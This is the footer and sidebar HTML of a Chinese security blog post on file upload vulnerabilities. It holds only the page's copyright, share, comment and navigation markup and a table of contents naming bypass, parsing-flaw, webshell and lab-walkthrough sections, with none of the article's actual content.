+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/Shalom.webp" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/Shalom.webp" title="头像" alt="头像"></a><div class="post-copyright__author_name">Shalom</div><div class="post-copyright__author_desc">Welcome!</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://blog.shalom86012.eu.org/2024/10/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://blog.shalom86012.eu.org/2024/10/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/')">文件上传漏洞</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://blog.shalom86012.eu.org/2024/10/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.shalom86012.eu.org" target="_blank">Shalom`s Blog</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>网络安全<span class="tagsPageCount">3</span></a><a class="post-meta__box__tags" href="/tags/web%E5%AE%89%E5%85%A8/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>web安全<span class="tagsPageCount">2</span></a><a class="post-meta__box__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>文件上传<span class="tagsPageCount">1</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://img.shalom86012.eu.org/imgs/wallhaven-5dg579.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2024/10/21/%E5%A6%82%E4%BD%95%E5%86%99%E4%B8%80%E7%AF%87%E5%90%88%E6%A0%BC%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/wallhaven-4doy2l.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">如何写一篇合格的漏洞报告</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/10/19/XSS%20%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/" title="XSS 跨站脚本攻击"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/shouanren.webp" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-10-19</div><div class="title">XSS 跨站脚本攻击</div></div></a></div><div><a href="/2024/10/21/%E5%A6%82%E4%BD%95%E5%86%99%E4%B8%80%E7%AF%87%E5%90%88%E6%A0%BC%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A/" title="如何写一篇合格的漏洞报告"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/wallhaven-4doy2l.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-10-21</div><div class="title">如何写一篇合格的漏洞报告</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div><div class="comment-tips" id="comment-tips"><span>✅ 你无需删除空行，直接评论以获取最佳展示效果</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/Shalom.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/emoji.webp" alt="status"/></div></div><div class="author-info__description">欢迎来到我的博客！</div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">Shalom</h1><div class="author-info__desc">Welcome!</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/pluviophile8" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="mailto:shalom86012@gmail.com" target="_blank" title="email"><i class="anzhiyufont anzhiyu-icon-envelope"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来看我的博客鸭~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80"><span class="toc-text">1 文件上传漏洞基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AE%9E%E6%88%98%E6%80%9D%E8%B7%AF"><span class="toc-text">1.1 文件上传实战思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%88%86%E7%B1%BB"><span class="toc-text">2 文件上传绕过分类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E5%89%8D%E7%AB%AF%E6%A3%80%E6%B5%8B"><span class="toc-text">2.1 前端检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-text">2.2 黑名单</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-1-%E7%89%B9%E6%AE%8A%E5%90%8E%E7%BC%80"><span class="toc-text">2.2.1 特殊后缀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-2-htaccess%E8%A7%A3%E6%9E%90-Apache"><span class="toc-text">2.2.2 .htaccess解析 (Apache)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-3-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">2.2.3 大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-4-%E7%82%B9%E7%BB%95%E8%BF%87-Windows"><span class="toc-text">2.2.4 点绕过 (Windows)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-5-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87-Windows"><span class="toc-text">2.2.5 空格绕过 (Windows)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-6-DATA%E7%BB%95%E8%BF%87-Windows"><span class="toc-text">2.2.6 ::$DATA绕过 (Windows)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-7-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">2.2.7 双写绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E7%99%BD%E5%90%8D%E5%8D%95"><span class="toc-text">2.3 白名单</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-1-MIME%E7%BB%95%E8%BF%87"><span class="toc-text">2.3.1 MIME绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-2-00%E6%88%AA%E6%96%AD"><span class="toc-text">2.3.2 %00截断</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-%E5%86%85%E5%AE%B9%E5%8F%8A%E5%85%B6%E4%BB%96"><span class="toc-text">2.4 内容及其他</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-1-%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%B5%8B"><span class="toc-text">2.4.1 文件头检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-2-%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="toc-text">2.4.2 二次渲染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-3-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-text">2.4.3 条件竞争</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-4-%E7%AA%81%E7%A0%B4getimagesize"><span class="toc-text">2.4.4 突破getimagesize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-%E7%AA%81%E7%A0%B4exif-imagetype"><span class="toc-text">4.5 突破exif_imagetype</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-text">3 解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-IIS%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-text">3.1 IIS解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-1-IIS5-0-6-0"><span class="toc-text">3.1.1 IIS5.0&#x2F;6.0</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E8%A7%A3%E6%9E%90"><span class="toc-text">目录解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90"><span class="toc-text">文件解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-2-IIS7-0-IIS7-5"><span class="toc-text">3.1.2 IIS7.0&#x2F;IIS7.5</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IIS7-0-IIS7-5-Fast-CGI"><span class="toc-text">IIS7.0&#x2F;IIS7.5 Fast-CGI</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-text">3.2 Apache解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-1-Apache%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-text">3.2.1 Apache换行解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-2-Apache%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-text">3.2.2 Apache多后缀解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-3-%E7%89%B9%E6%AE%8A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90"><span class="toc-text">3.2.3 特殊后缀解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-4-htaccess%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-text">3.2.4 .htaccess解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-5-Apache-SSI-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">3.2.5 Apache SSI 远程命令执行漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-6-Apache%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">3.2.6 Apache文件读取&amp;命令执行漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-7-Apache%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E"><span class="toc-text">3.2.7 Apache路径穿越漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-text">3.3 Nginx解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-1-%E7%A9%BA%E5%AD%97%E8%8A%82%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">3.3.1 空字节代码执行漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-2-%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-text">3.3.2 文件名逻辑漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-3-PHP-CGI%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-text">3.3.3 PHP CGI解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-4-user-ini"><span class="toc-text">3.3.4 .user.ini</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E"><span class="toc-text">4 编辑器漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-WAF%E7%BB%95%E8%BF%87"><span class="toc-text">5 WAF绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-HTTP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%95%B0%E6%8D%AE%E5%8C%85%E8%A7%A3%E6%9E%90"><span class="toc-text">5.1 HTTP文件上传数据包解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-1-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9C%A8%E6%95%B0%E6%8D%AE%E5%8C%85%E4%B8%AD%E5%8F%AF%E4%BF%AE%E6%94%B9%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="toc-text">5.1.1 文件上传在数据包中可修改的地方</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-%E5%AD%97%E7%AC%A6%E5%8F%98%E5%BC%82"><span class="toc-text">5.2 字符变异</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-1-%E5%BC%95%E5%8F%B7%E5%8F%98%E6%8D%A2"><span class="toc-text">5.2.1 引号变换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-2-%E5%A4%A7%E5%B0%8F%E5%86%99%E5%8F%98%E6%8D%A2"><span class="toc-text">5.2.2 大小写变换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-3-%E6%B7%BB%E5%8A%A0%E6%8D%A2%E8%A1%8C%E7%AC%A6"><span class="toc-text">5.2.3 添加换行符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-4-%E5%A4%9A%E4%B8%AA%E5%88%86%E5%8F%B7"><span class="toc-text">5.2.4 多个分号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-5-%E5%A4%9A%E4%B8%AA%E7%AD%89%E5%8F%B7"><span class="toc-text">5.2.5 多个等号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-6-%E5%8F%98%E6%8D%A2Content-Disposition%E7%9A%84%E5%80%BC"><span class="toc-text">5.2.6 变换Content-Disposition的值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-7-%E7%95%B8%E5%BD%A2%E7%9A%84boundary%E5%A4%B4%E9%83%A8"><span class="toc-text">5.2.7 畸形的boundary头部</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-3-%E9%A1%BA%E5%BA%8F%E9%A2%A0%E5%80%92"><span class="toc-text">5.3 顺序颠倒</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-1-%E4%BA%A4%E6%8D%A2name%E5%92%8Cfilename%E7%9A%84%E9%A1%BA%E5%BA%8F"><span class="toc-text">5.3.1 交换name和filename的顺序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-2-%E4%BA%A4%E6%8D%A2Content-Disposition%E5%92%8CContent-Type%E7%9A%84%E9%A1%BA%E5%BA%8F"><span class="toc-text">5.3.2 交换Content-Disposition和Content-Type的顺序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-3-%E4%BA%A4%E6%8D%A2%E4%B8%8D%E5%90%8Cboundary%E5%86%85%E5%AE%B9%E7%9A%84%E9%A1%BA%E5%BA%8F"><span class="toc-text">5.3.3 交换不同boundary内容的顺序</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-4-%E6%95%B0%E6%8D%AE%E9%87%8D%E5%A4%8D"><span class="toc-text">5.4 数据重复</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4-1-boundary%E5%86%85%E5%AE%B9%E9%87%8D%E5%A4%8D"><span class="toc-text">5.4.1 boundary内容重复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4-2-filename%E9%87%8D%E5%A4%8D"><span class="toc-text">5.4.2 filename重复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-5-%E6%95%B0%E6%8D%AE%E6%BA%A2%E5%87%BA"><span class="toc-text">5.5 数据溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-5-1-name%E4%B8%8Efilename%E4%B9%8B%E9%97%B4%E6%8F%92%E5%85%A5%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE"><span class="toc-text">5.5.1 name与filename之间插入垃圾数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-5-2-boundary%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E5%8A%A0%E5%85%A5%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE"><span class="toc-text">5.5.2 boundary字符串中加入垃圾数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-5-3-boundray%E6%9C%AB%E5%B0%BE%E6%8F%92%E5%85%A5%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE"><span class="toc-text">5.5.3 boundray末尾插入垃圾数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-5-4-multipart-form-data%E4%B8%8Eboundary%E4%B9%8B%E9%97%B4%E6%8F%92%E5%85%A5%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE"><span class="toc-text">5.5.4 multipart&#x2F;form-data与boundary之间插入垃圾数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-6-%E6%95%B0%E6%8D%AE%E6%88%AA%E6%96%AD"><span class="toc-text">5.6 数据截断</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-6-1-%E5%9B%9E%E8%BD%A6%E6%8D%A2%E8%A1%8C%E6%88%AA%E6%96%AD"><span class="toc-text">5.6.1 回车换行截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-6-2-%E5%88%86%E5%8F%B7%E6%88%AA%E6%96%AD"><span class="toc-text">5.6.2 分号截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-6-3-%E5%BC%95%E5%8F%B7%E6%88%AA%E6%96%AD"><span class="toc-text">5.6.3 引号截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-6-4-00%E6%88%AA%E6%96%AD"><span class="toc-text">5.6.4 00截断</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-7-%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87"><span class="toc-text">5.7 安全狗绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-7-1-%E7%BC%96%E5%86%99%E8%84%9A%E6%9C%AC%E5%88%A9%E7%94%A8%E6%95%B0%E6%8D%AE%E6%BA%A2%E5%87%BA%E7%BB%95%E8%BF%87"><span class="toc-text">5.7.1 编写脚本利用数据溢出绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-7-2-%E5%88%A9%E7%94%A800%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87"><span class="toc-text">5.7.2 利用00截断绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D"><span class="toc-text">6 安全修复</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C%E6%96%B9%E6%B3%95"><span class="toc-text">7 图片马制作方法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-Webshell%E5%85%8D%E6%9D%80"><span class="toc-text">8 Webshell免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#8-1-%E5%8F%AF%E5%8F%98%E5%8F%98%E9%87%8F%E7%BB%95%E8%BF%87"><span class="toc-text">8.1 可变变量绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-2-%E5%90%84%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BB%95%E8%BF%87"><span class="toc-text">8.2 各种加密绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-3-%E4%BC%A0%E5%8F%82%E7%BB%95%E8%BF%87"><span class="toc-text">8.3 传参绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-3-%E4%BC%A0%E5%8F%82%E6%B7%B7%E6%B7%86"><span class="toc-text">8.3 传参混淆</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9-upload-labs-21%E5%85%B3"><span class="toc-text">9 upload-labs 21关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-01-%E5%89%8D%E7%AB%AF%E6%A3%80%E9%AA%8C%E7%BB%95%E8%BF%87"><span class="toc-text">Pass-01 前端检验绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-02-MIME%E7%B1%BB%E5%9E%8B"><span class="toc-text">Pass-02 MIME类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-03-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87%E4%B9%8Bphp3%E3%80%81php5"><span class="toc-text">Pass-03 黑名单绕过之php3、php5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-04-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-htaccess%E5%92%8C%E6%96%87%E4%BB%B6%E5%90%8D%E5%8F%A0%E5%8A%A0%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87"><span class="toc-text">Pass-04 黑名单绕过.htaccess和文件名叠加特性绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#htaccess"><span class="toc-text">.htaccess</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E5%8F%B7%E9%85%8D%E5%90%88IIS%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-text">分号配合IIS解析漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%92%E5%8F%B7%E9%85%8D%E5%90%88PHP%E5%92%8CWindows%E6%96%87%E4%BB%B6%E5%91%BD%E5%90%8D%E7%8E%AF%E5%A2%83%E7%9A%84%E5%8F%A0%E5%8A%A0%E7%89%B9%E6%80%A7"><span class="toc-text">冒号配合PHP和Windows文件命名环境的叠加特性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-05-user-ini"><span class="toc-text">Pass-05 .user.ini</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-06-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">Pass-06 大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-07-%E7%A9%BA%E6%A0%BC%E7%82%B9"><span class="toc-text">Pass-07 空格点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-08-%E7%A9%BA%E6%A0%BC%E7%82%B9%E3%80%81%E7%82%B9%E7%A9%BA%E6%A0%BC"><span class="toc-text">Pass-08 空格点、点空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-09-%E5%9F%BA%E4%BA%8E%E6%96%87%E4%BB%B6%E6%B5%81%E7%89%B9%E6%80%A7-DATA%E7%BB%95%E8%BF%87"><span class="toc-text">Pass-09 基于文件流特性::$DATA绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-10-%E7%82%B9%E7%A9%BA%E6%A0%BC%E7%82%B9"><span class="toc-text">Pass-10 点空格点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-11-%E5%8F%8C%E5%86%99"><span class="toc-text">Pass-11 双写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-12-00%E6%88%AA%E6%96%AD"><span class="toc-text">Pass-12 %00截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-13-00%E7%BB%95%E8%BF%87"><span class="toc-text">Pass-13 00绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-14-%E5%9B%BE%E7%89%87%F0%9F%90%8E"><span class="toc-text">Pass-14 图片🐎</span></a></li><li class="toc-item 